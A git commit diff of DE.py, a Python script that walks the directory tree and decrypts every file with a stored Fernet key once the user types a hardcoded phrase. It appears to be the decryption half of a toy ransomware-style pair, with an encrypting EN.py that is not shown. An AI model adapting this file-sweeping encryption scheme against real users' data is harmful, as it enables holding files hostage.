0d5ae7f331d1c0ceabbf141093f535403f45f3c6
Kadefrfr <153398756+Kadefrfr@users.noreply.github.com>
2023-12-16 20:03:12 -0600

    DE.py

--- DE.py
+++ DE.py
@@ -3,30 +3,32 @@
 import os
 from cryptography.fernet import Fernet
 
+def decrypt_file(file_path, key):
+    with open(file_path, "rb") as thefile:
+        contents = thefile.read()
+    contents_decrypted = Fernet(key).decrypt(contents)
+    with open(file_path, "wb") as thefile:
+        thefile.write(contents_decrypted)
 
 files = []
 
-for file in os.listdir()
-	if file == "EN.py", or file == "thekey.key", or file == "DE.py:
-		continue
-	if os.path.isfile(file):
-		files.append(file)
+for root, _, filenames in os.walk('.'):
+    for filename in filenames:
+        if filename in ["EN.py", "thekey.key", "DE.py"]:
+            continue
+        file_path = os.path.join(root, filename)
+        files.append(file_path)
 
+with open("thekey.key", "rb") as key_file:
+    secret_key = key_file.read()
 
-with open("thekey.key", "rb") as key:
-        secretkey = key.read()
-
-secretphrase = "Owen"
+secret_phrase = "Owen"
 
 user_phrase = input("Enter the phrase\n")
 
-if user_phrase == secretphrase:
-	for file in files:
-		with open(file, "rb") as thefile:
-			contents = thefile.read()
-		contents_decrypted = Fernet(secretkey).decrypt(contents)
-		with open(file, "wb") as thefile:
-			thefile.write(contents_encrypted)
-		print("I guess ill decrypt them")
+if user_phrase == secret_phrase:
+    for file_path in files:
+        decrypt_file(file_path, secret_key)
+    print("Files decrypted successfully.")
 else:
-	print("Yeah right")
+    print("Incorrect phrase. Unable to decrypt files.")
